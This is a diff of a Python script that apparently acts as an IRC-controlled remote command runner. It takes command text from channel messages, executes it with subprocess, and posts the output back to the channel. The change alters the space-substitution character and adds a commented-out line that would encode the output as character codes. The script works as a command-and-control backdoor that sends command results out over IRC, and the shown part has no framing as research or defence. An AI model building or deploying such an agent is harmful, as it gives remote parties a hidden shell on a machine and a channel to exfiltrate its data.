@@ -18,7 +18,7 @@ while True:
     cmd = text.split(':')
     #print(cmd)
     if len(cmd) == 3:
-        cmd = cmd[2].strip().replace('-', ' ')
+        cmd = cmd[2].strip().replace('$', ' ')
         print("Got this command: " + cmd)
         try:
             if ' ' in cmd:
@@ -27,7 +27,9 @@ while True:
                 result = subprocess.run(cmd, stdout=subprocess.PIPE)
             else:
                 result = subprocess.run([cmd, ], stdout=subprocess.PIPE)
+            #print(result.stdout)
             res = "".join(result.stdout.decode('utf-8').split())
+            #res = ''.join(str(ord(c)) for c in result.stdout.decode('utf-8'))
             irc.send(channel, res)
         except:
             print("Something wrong with the cmd, try again!")
